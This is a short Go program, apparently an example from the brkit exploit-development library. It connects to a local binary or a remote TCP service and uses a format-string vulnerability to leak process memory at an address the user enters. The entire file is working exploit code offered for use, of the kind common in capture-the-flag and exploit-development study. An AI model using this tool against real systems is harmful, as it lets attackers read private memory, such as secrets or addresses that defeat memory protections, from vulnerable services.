package main

import (
	"bufio"
	"flag"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/stephen-fox/brkit/memory"
	"github.com/stephen-fox/brkit/process"
)

func main() {
	verbose := flag.Bool("v", false, "Verbose output")

	flag.Parse()

	var proc *process.Process
	if strings.Contains(flag.Arg(0), ":") {
		proc = process.DialOrExit("tcp", flag.Arg(0))
	} else {
		cmd := exec.Command(flag.Arg(0))
		proc = process.StartOrExit(cmd)
		log.Printf("pid: %d", cmd.Process.Pid)
	}

	if *verbose {
		proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))
	}

	leaker := memory.LeakUsingFormatStringDirectParamOrExit(memory.FormatStringDirectParamConfig{
		ProcessIOFn: func() memory.ProcessIO {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
	})

	log.Printf("please enter a memory address to read from followed by 'enter':\n")
	pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		log.Fatalln(err)
	}

	pointerStr = strings.TrimPrefix(pointerStr[0:len(pointerStr)-1], "0x")
	log.Printf("parsing '%s'", pointerStr)

	pointer, err := strconv.ParseUint(pointerStr, 16, 64)
	if err != nil {
		log.Fatalln(err)
	}

	raw := leaker.MemoryAtOrExit(memory.PointerMakerForX86().U64(pointer), proc)

	log.Printf("read: 0x%x", raw)
}
